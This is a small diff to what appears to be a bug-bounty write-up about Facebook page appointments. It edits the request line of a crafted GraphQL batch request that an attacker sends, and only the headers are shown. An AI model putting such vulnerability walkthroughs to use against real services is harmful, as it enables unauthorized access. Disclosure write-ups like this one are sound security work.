@@ -25,7 +25,7 @@ Victim (page admin of `page_a`) creates an appointment on their page.
 The attacker sends a crafted GraphQL batch request:
 
 ```http
-POST /api/graphqlbatch/?dpr=1 HTTP/1.1
+POST /api/graphqlbatch/ HTTP/1.1
 Host: www.facebook.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
 Accept: */*
